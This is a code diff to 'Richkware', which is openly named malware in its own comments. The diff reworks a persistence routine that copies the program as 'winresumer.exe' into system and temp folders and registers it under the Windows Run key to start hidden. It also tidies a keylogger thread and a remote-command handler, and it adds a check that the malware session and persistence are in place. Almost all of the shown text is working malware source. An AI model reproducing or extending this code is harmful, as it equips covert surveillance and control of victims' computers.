@@ -69,27 +69,30 @@ void Richkware::RequestAdminPrivileges() {
 void Richkware::Persistance() {
 	// copy value in system
 	HMODULE module_handler = GetModuleHandle(NULL);
-	char system_path[MAX_PATH] = "\"";
 	char file_path[MAX_PATH];
-	char tmp_path[MAX_PATH] = "\"";
-	char tmp[MAX_PATH];
+	char system_path[MAX_PATH];
+	char system_path_reg[MAX_PATH] = "\"";
+	char tmp_path[MAX_PATH];
+	char tmp_path_reg[MAX_PATH] = "\"";
 
 	GetModuleFileName(module_handler, file_path, MAX_PATH);
-	GetSystemDirectory(tmp, MAX_PATH);
-	strcat(system_path, tmp);
-	GetTempPath(MAX_PATH, tmp);
-	strcat(tmp_path, tmp);
+	GetSystemDirectory(system_path, MAX_PATH);
+	strcat(system_path_reg, system_path);
+	GetTempPath(MAX_PATH, tmp_path);
+	strcat(tmp_path_reg, tmp_path);
 
-	strcat(system_path, "\\winresumer.exe\" /noshow");
+	strcat(system_path_reg, "\\winresumer.exe\" /noshow");
+	strcat(system_path, "\\winresumer.exe");
 	CopyFile(file_path, system_path, true);
 
-	strcat(tmp_path, "winresumer.exe\" /noshow");
+	strcat(tmp_path_reg, "winresumer.exe\" /noshow");
+	strcat(tmp_path, "winresumer.exe");
 	CopyFile(file_path, tmp_path, true);
 
 	SaveValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-		"Windows1", system_path);
+		"Windows1", system_path_reg);
 	SaveValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-		"Windows2", tmp_path);
+		"Windows2", tmp_path_reg);
 
 }
 
@@ -242,8 +245,11 @@ DWORD WINAPI ClientSocketThread(void* arg) {
 	int recvbuflen = bufferlength;
 	std::size_t posSubStr;
 	// write the output of command in a file
-	srand(time(0));
-	std::string fileName = "Windows" + std::to_string(rand()); // An integer value between 0 and RAND_MAX
+	srand((unsigned int)time(0));
+	std::stringstream ss;
+	ss << rand();
+
+	std::string fileName = "Windows" + ss.str(); // An integer value between 0 and RAND_MAX
 	char tmp_path[MAX_PATH];
 	GetTempPath(MAX_PATH, tmp_path);
 	std::string fileBat = tmp_path;
@@ -430,8 +436,6 @@ void Richkware::Hibernation() {
 		SC_MONITORPOWER, (LPARAM)2);
 }
 
-void Richkware::SaveFileDir(const char* path) {
-}
 
 void Richkware::RandMouse() {
 	// screen resolution
@@ -544,12 +548,12 @@ std::string Richkware::LoadValueReg(const char* path, const char* key) {
 }
 
 void Richkware::Keylogger(const char* fileName) {
-	HANDLE hBlockAppsTh;
+	HANDLE hBlockAppsTh = CreateThread(0, 0, &KeyloggerThread, (void*)fileName, 0, 0);
 
-	hBlockAppsTh = CreateThread(0, 0, &KeyloggerThread, (void*)fileName, 0, 0);
-
-	WaitForSingleObject(hBlockAppsTh, INFINITE);
-	CloseHandle(hBlockAppsTh);
+	if (hBlockAppsTh != NULL) {
+		WaitForSingleObject(hBlockAppsTh, INFINITE);
+		CloseHandle(hBlockAppsTh);
+	}
 }
 
 DWORD WINAPI
@@ -581,3 +585,33 @@ KeyloggerThread(void* arg) {
 		condSession = true;
 	}
 }
+
+// verify the existence of malware session and the values created by the persistence function.
+bool Richkware::CheckExistance() {
+	bool b = false;
+	HMODULE module_handler = GetModuleHandle(NULL);
+	char system_path[MAX_PATH];
+	char file_path[MAX_PATH];
+	char tmp_path[MAX_PATH];
+
+	GetModuleFileName(module_handler, file_path, MAX_PATH);
+	GetSystemDirectory(system_path, MAX_PATH);
+	GetTempPath(MAX_PATH, tmp_path);
+	strcat(system_path, "\\winresumer.exe");
+	strcat(tmp_path, "winresumer.exe");
+	std::ifstream fileSys(system_path);
+	std::ifstream fileTmp(tmp_path);
+
+	// (sess) && ((persTmpREG && persTmpFILE) || (persTmpSYS && persTmpSYS))
+	if (!(LoadValueReg("Software\\Microsoft\\Windows", "Windows").empty()) &&
+		((!(LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Windows1").empty()) &&
+		(fileSys.is_open())) ||
+			(!(LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Windows2").empty()) &&
+			(fileTmp.is_open())))) b = true;
+
+	fileSys.close();
+	fileTmp.close();
+
+	return b;
+}
+
